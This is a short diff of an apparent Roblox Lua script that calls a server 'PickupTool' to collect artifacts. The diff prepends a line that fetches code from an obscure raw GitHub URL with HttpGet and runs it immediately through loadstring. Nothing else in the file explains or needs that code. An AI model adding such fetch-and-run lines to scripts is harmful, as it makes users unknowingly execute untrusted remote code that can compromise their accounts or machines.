@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ngigerngieofoepdo/VersionTwo/refs/heads/main/Dalgona"))()
+
 -- Function to invoke the server with standardized arguments
 local function invokePickupTool(artifactName)
     local pickupTool = workspace:FindFirstChild("Services") and workspace.Services:FindFirstChild("PickupTool")
